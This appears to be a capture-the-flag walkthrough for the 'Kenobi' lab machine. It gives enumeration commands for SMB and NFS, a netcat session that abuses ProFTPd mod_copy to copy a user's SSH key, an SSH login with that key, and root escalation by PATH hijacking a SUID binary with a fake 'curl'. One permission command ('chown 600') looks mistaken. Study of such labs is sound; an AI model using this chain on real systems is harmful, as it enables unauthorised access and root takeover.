### [nmap.init.out](./nmap.init.out)
### [nmap.111.out](./nmap.111.out)
### [nmap.445.out](./nmap.445.out)
### [smb_dl--log.txt](./smb_dl--log.txt)
### [nc.21.txt](./nc.21.txt)
### [strings.usr.bin.menu.txt](./strings.usr.bin.menu.txt)
### [kenobi_id_rsa.pub](./kenobi_id_rsa.pub)
### [kenobi_id_rsa](./kenobi_id_rsa)

## SMB

![](https://i.imgur.com/bkgVNy3.png)

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP`

use `smbclient` to connect `smbget` to download files after login
- `smbclient //<ip>/anonymous`
- `smbget -R smb://<ip>/anonymous`

```
nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
```

```bash
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.168.251
```

## ProFtpd

```
The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.
```

```bash
$ nc RHOST RPORT
SITE CPFR /home/kenobi/.ssh
SITE CPTO /var/tmp/ssh

# mount from host
$ mkdir /media/kenobinfs
$ mount RHOST:/var /media/kenobinfs

$ chown 600 KENOBI_SSH_KEY
$ ssh -i KENOBI_SSH_KEY kenobi@RHOST
```

##  Privilege Escalation with Path Variable Manipulation

![](https://i.imgur.com/LN2uOCJ.png)

| Permission | On Files | On Directories |
|--------------|-----------|------------|
| SUID Bit | User executes the file with permissions of the file owner | - |
| SGID Bit | User executes the file with the permission of the group owner. | File created in directory gets the same group owner. |
| Sticky Bit | No meaning | Users are prevented from deleting files from other users. |


## To search the a system for these type of files run the following:
```bash
$ find / -perm -u=s -type f 2>/dev/null
```

```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu <== 🤔
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

- `strings` is a command on Linux that looks for human readable strings on a binary. => `strings.usr.bin.menu.txt`
- Look for `the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).`
    - in this case `curl`

```bash
# in /tmp

$ echo /bin/bash > curl
$ chmod 777 curl
$ export PATH=/tmp:$PATH
$ /usr/bin/menu
```
